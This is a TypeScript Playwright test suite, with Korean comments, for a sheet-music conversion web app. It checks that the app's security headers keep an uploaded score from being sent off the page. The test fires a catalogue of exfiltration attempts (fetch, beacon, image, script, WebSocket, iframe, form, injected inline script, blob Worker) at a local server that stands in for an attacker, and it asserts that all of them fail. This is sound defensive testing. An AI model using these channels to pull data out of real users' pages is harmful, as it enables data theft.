// 변환 중에 악보가 밖으로 나갈 수 없는지, 보안 설정이 기능을 막지 않는지 확인한다.
import assert from "node:assert/strict";
import { createServer, type Server } from "node:http";
import { readdirSync } from "node:fs";
import { join } from "node:path";
import { after, before, test } from "node:test";
import { chromium, webkit, type Page } from "playwright";
import { OUT, serveOut, watch } from "./support.ts";

const score = join(import.meta.dirname, "..", "scores", "c-six-eight.pdf");
const started: Server[] = [];
let outside: string;
const received: string[] = [];
before(async () => {
  // 악보를 훔치려는 바깥 서버
  const server = createServer((request, response) => {
    received.push(`${request.method} ${request.url}`);
    response.writeHead(200, { "access-control-allow-origin": "*", "content-type": "text/javascript" });
    response.end("self.stolen=1");
  });
  await new Promise<void>((done) => server.listen(0, "127.0.0.1", done));
  started.push(server);
  outside = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
});
after(() => started.forEach((s) => (s.close(), s.closeAllConnections())));

/** 페이지 안에서 바깥으로 보내 보기 */
async function trySend(page: Page) {
  await page.evaluate(async (to) => {
    const quiet = async (f: () => unknown) => {
      try {
        await f();
      } catch {}
    };
    await quiet(() => fetch(to + "/fetch", { method: "POST", body: "score", mode: "no-cors" }));
    await quiet(() => navigator.sendBeacon(to + "/beacon", "score"));
    await quiet(() => new Promise((done) => Object.assign(new Image(), { onload: done, onerror: done, src: to + "/image" })));
    await quiet(() => new Promise((done) => document.head.append(Object.assign(document.createElement("script"), { onload: done, onerror: done, src: to + "/script.js" }))));
    await quiet(() => new Promise((done) => document.head.append(Object.assign(document.createElement("link"), { rel: "stylesheet", onload: done, onerror: done, href: to + "/style.css" }))));
    await quiet(() => new Promise<void>((done) => {
      const request = new XMLHttpRequest();
      request.onloadend = () => done();
      request.open("POST", to + "/xhr");
      request.send("score");
    }));
    await quiet(() => new Promise((done) => Object.assign(new WebSocket(to.replace("http", "ws") + "/socket"), { onerror: done, onclose: done })));
    await quiet(() => new Promise((done) => {
      const frame = Object.assign(document.createElement("iframe"), { src: to + "/frame" });
      frame.onload = frame.onerror = done;
      document.body.append(frame);
      setTimeout(done, 500);
    }));
    const form = Object.assign(document.createElement("form"), { method: "post", action: to + "/form", target: "_blank" });
    document.body.append(form);
    await quiet(() => form.submit());
    const inline = document.createElement("script");
    inline.textContent = "window.inlineRan = 1";
    document.head.append(inline);
    await new Promise((done) => setTimeout(done, 700));
  }, outside);
  return page.evaluate(() => (window as never as { inlineRan?: number }).inlineRan);
}

for (const type of [chromium, webkit])
  for (const withHeaders of [true, false]) {
    test(`${type.name()}: 변환한 뒤 밖으로 보낼 수 없다 (${withHeaders ? "배포 헤더" : "헤더 없는 호스팅"})`, { timeout: 180_000 }, async () => {
      const { server, url } = await serveOut(withHeaders);
      started.push(server);
      const browser = await type.launch();
      try {
        const page = await browser.newPage();
        const seen = watch(page, [url]);
        await page.goto(url + "/convert/");
        await page.locator("input[type=file]").setInputFiles(score);
        await page.locator(".editor").waitFor({ timeout: 150_000 });
        assert.deepEqual([seen.external, seen.problems], [[], []], "보안 설정이 변환을 막지 않음");
        received.length = 0;
        assert.equal(await trySend(page), undefined, "끼워 넣은 인라인 스크립트가 실행되지 않음");
        assert.deepEqual(received, []);
      } finally {
        await browser.close();
      }
    });
  }

for (const type of [chromium, webkit])
  test(`${type.name()}: Worker에서도 밖으로 보낼 수 없다 (배포 헤더)`, { timeout: 60_000 }, async () => {
    const { server, url } = await serveOut();
    started.push(server);
    const browser = await type.launch();
    try {
      const page = await browser.newPage();
      await page.goto(url + "/convert/");
      // 같은 사이트의 파일로 만든 Worker 안에서 바깥으로 보내 본다.
      const worker = readdirSync(join(OUT, "_next/static/chunks")).find((f) => f.startsWith("turbopack-worker"))!;
      received.length = 0;
      const result = await page.evaluate(
        async ([path, to]) => {
          const blob = new Blob([`fetch(${JSON.stringify(to)} + "/worker", { method: "POST", body: "score", mode: "no-cors" }).then(() => postMessage("보냄"), () => postMessage("막힘"))`], { type: "text/javascript" });
          const response = await fetch(path!);
          const inBlob = await new Promise((done) => (new Worker(URL.createObjectURL(blob)).onmessage = (e) => done(e.data)));
          return [inBlob, response.headers.get("content-security-policy")?.includes("connect-src 'self'")];
        },
        [`/_next/static/chunks/${worker}`, outside],
      );
      assert.deepEqual(result, ["막힘", true]);
      assert.deepEqual(received, []);
    } finally {
      await browser.close();
    }
  });

test("모든 페이지가 보안 설정 아래에서 오류 없이 열린다", { timeout: 120_000 }, async () => {
  const { server, url } = await serveOut();
  started.push(server);
  const browser = await chromium.launch();
  try {
    for (const width of [360, 1200]) {
      const page = await browser.newPage({ viewport: { width, height: 800 } });
      const seen = watch(page, [url]);
      for (const path of ["/", "/convert/", "/example/", "/guide/", "/rhythm/", "/terms/", "/privacy/", "/copyright/", "/licenses/"]) {
        await page.goto(url + path);
        await page.waitForLoadState("networkidle");
        assert.ok(await page.locator("h1").count(), path);
        assert.equal(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth), true, `${path} ${width}px에서 가로로 넘침`);
      }
      assert.deepEqual([seen.external, seen.problems], [[], []]);
      for (const link of await page.locator("main table a").all()) {
        const response = await page.request.get(url + (await link.getAttribute("href")));
        assert.ok(response.ok() && (await response.body()).length > 400, (await link.getAttribute("href"))!);
      }
      await page.close();
    }
  } finally {
    await browser.close();
  }
});
